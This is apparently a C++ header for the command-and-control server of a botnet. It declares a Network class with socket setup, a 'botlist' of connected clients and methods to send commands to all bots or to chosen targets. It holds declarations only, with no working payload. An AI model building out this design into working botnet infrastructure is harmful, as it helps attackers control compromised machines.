

#ifndef NETWORK_HPP
# define NETWORK_HPP

#include <unistd.h>
#include <fcntl.h>
#include <iostream>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <vector>
#include <map>
#include <sys/select.h>

/*
**	Server class
*/

class Network {

	private:
		int									sockfd;
		int									fd_max;
		struct sockaddr_in					sockaddr;
		std::vector<int>					port_list;
		fd_set								botlist;
		std::map<std::string, int>			address_port;


		void ErrorAndExit(std::string); 	// Error and exit
											// made private as accidental
											// exploitation can crash
											// server
		void NewConnection(void);			// Accept new conection in
											// CommandLoop();
		void SendBuffer(void);				// Write STDIN
		void RecvBuffer(void);				// Read STDIN
		void ManageClientResponse(std::string command);
		void ManageClientResponse(std::string command, 
				std::vector<std::string> target_list);

											// Send to all bots

	public:
		Network(int port_number);			// initalize botnet.
		~Network(void);						// close main socket.
		void ZeroBotlist(void);
		void CommandLoop(void);
};






#endif
